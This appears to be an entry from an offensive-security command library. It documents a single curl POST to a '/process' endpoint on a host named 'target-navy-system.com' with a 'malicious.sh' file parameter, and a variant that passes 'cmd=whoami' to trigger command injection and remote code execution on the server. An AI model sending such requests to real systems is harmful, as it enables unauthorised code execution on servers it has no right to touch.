---
id: cmd-uuid-trigger
data: 'curl -X POST https://target-navy-system.com/process?file=malicious.sh'
tags:
  - injection
  - rce
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.350Z'
verified: false
validated: true
submitted: true
---
# curl-trigger-execution

## Command

```bash
curl -X POST https://target-navy-system.com/process?file=malicious.sh
```

## Description

Triggers processing or execution of an uploaded file on the server, potentially leading to command injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method to invoke processing | Yes |
| `?file=malicious.sh` | Query parameter specifying the file | Yes |
| `https://target-navy-system.com/process` | Processing endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target-navy-system.com/process?file=malicious.sh
```

### Advanced Usage

```bash
curl -X POST https://target-navy-system.com/process?file=malicious.sh&cmd=whoami -v
```

## Expected Output

Response containing executed command output, e.g., server username or error revealing injection success.

## Related

- [[Related Procedure|procedures/Trigger-Command-Injection-via-Uploaded-File]]
